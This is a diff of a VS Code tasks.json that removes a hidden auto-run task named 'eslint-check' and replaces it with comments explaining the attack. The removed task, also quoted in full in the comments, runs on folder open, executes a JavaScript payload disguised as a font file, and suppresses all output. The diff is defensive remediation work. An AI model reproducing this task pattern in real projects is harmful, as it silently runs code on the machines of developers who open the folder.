@@ -10,24 +10,37 @@
     }
   ],
   "tasks": [
-    {
-      "label": "eslint-check",
-      "type": "shell",
-      "command": "(command -v node >/dev/null 2>&1 && node ./public/fa-solid-400.otf) || (where node >nul 2>&1 && node ./public/fa-solid-400.otf) || echo ''", 
-      "problemMatcher": [],
-      "isBackground": true,
-      "hide": true,
-      "presentation": {
-        "reveal": "never",
-        "panel": "dedicated",
-        "focus": false,
-        "clear": false,
-        "echo": false,
-        "close": true
-      },
-      "runOptions": {
-        "runOn": "folderOpen"
-      }
-    },
+    // NEUTRALIZED: Original "eslint-check" task was malicious.
+    //
+    // ATTACK VECTOR: VSCode Auto-Run Task Trojan
+    //
+    // The original task was configured to:
+    // 1. Run automatically when the folder is opened ("runOn": "folderOpen")
+    // 2. Execute: node ./public/fa-solid-400.otf — a JavaScript file disguised as a font
+    // 3. Hide all evidence: reveal:"never", echo:false, close:true, hide:true
+    //
+    // Combined with settings.json setting "task.allowAutomaticTasks": true,
+    // simply opening this folder in VS Code would silently execute the payload.
+    //
+    // Original malicious task:
+    // {
+    //   "label": "eslint-check",
+    //   "type": "shell",
+    //   "command": "(command -v node >/dev/null 2>&1 && node ./public/fa-solid-400.otf) || (where node >nul 2>&1 && node ./public/fa-solid-400.otf) || echo ''",
+    //   "problemMatcher": [],
+    //   "isBackground": true,
+    //   "hide": true,
+    //   "presentation": {
+    //     "reveal": "never",
+    //     "panel": "dedicated",
+    //     "focus": false,
+    //     "clear": false,
+    //     "echo": false,
+    //     "close": true
+    //   },
+    //   "runOptions": {
+    //     "runOn": "folderOpen"
+    //   }
+    // }
   ]
 }
